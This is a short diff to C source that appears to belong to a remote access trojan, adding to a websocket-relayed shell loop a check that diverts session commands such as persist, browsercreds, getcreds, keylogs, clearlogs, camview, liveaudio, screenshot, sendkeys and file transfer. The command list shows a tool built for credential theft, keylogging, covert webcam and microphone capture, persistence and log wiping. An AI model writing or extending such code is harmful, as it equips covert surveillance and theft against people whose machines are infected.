@@ -1179,6 +1179,32 @@ void run_terminal() {
             break;
         }
         
+        // Commands that should NOT run in shell - return to session prompt for these
+        if (strcmp(cmd, "help") == 0 || strcmp(cmd, "background") == 0 || 
+            strcmp(cmd, "back") == 0 || strcmp(cmd, "screenshot") == 0 ||
+            strcmp(cmd, "sysinfo") == 0 || strcmp(cmd, "ps") == 0 ||
+            strcmp(cmd, "persist") == 0 || strcmp(cmd, "unpersist") == 0 ||
+            strcmp(cmd, "liveview") == 0 || strcmp(cmd, "stoplive") == 0 ||
+            strcmp(cmd, "camview") == 0 || strcmp(cmd, "stopcam") == 0 ||
+            strcmp(cmd, "liveaudio") == 0 || strcmp(cmd, "stopaudio") == 0 ||
+            strcmp(cmd, "listcam") == 0 || strcmp(cmd, "camshot") == 0 ||
+            strcmp(cmd, "startrecord") == 0 || strcmp(cmd, "stoprecord") == 0 ||
+            strcmp(cmd, "getrecord") == 0 || strcmp(cmd, "delrecord") == 0 ||
+            strcmp(cmd, "browsercreds") == 0 || strcmp(cmd, "keylogs") == 0 ||
+            strcmp(cmd, "clearlogs") == 0 || strcmp(cmd, "getcreds") == 0 ||
+            strncmp(cmd, "download ", 9) == 0 || strncmp(cmd, "upload ", 7) == 0 ||
+            strncmp(cmd, "downloadfolder ", 15) == 0 || strncmp(cmd, "dldir ", 6) == 0 ||
+            strncmp(cmd, "mousemove ", 10) == 0 || strcmp(cmd, "click") == 0 ||
+            strcmp(cmd, "leftclick") == 0 || strcmp(cmd, "rightclick") == 0 ||
+            strncmp(cmd, "sendkeys ", 9) == 0 || strncmp(cmd, "type ", 5) == 0 ||
+            strncmp(cmd, "selectcam ", 10) == 0 || strncmp(cmd, "soundrecord", 11) == 0) {
+            send_websocket_data("[!] Use 'exit' to leave shell first, then run this command\n", 59);
+            sprintf(prompt, "shell:%s> ", g_current_dir);
+            send_websocket_data(prompt, strlen(prompt));
+            sent_prompt = 1;
+            continue;
+        }
+        
         // Handle drive change (e.g., "D:" or "d:")
         if (clen == 2 && cmd[1] == ':') {
             char drive_path[4] = {cmd[0], ':', '\\', '\0'};
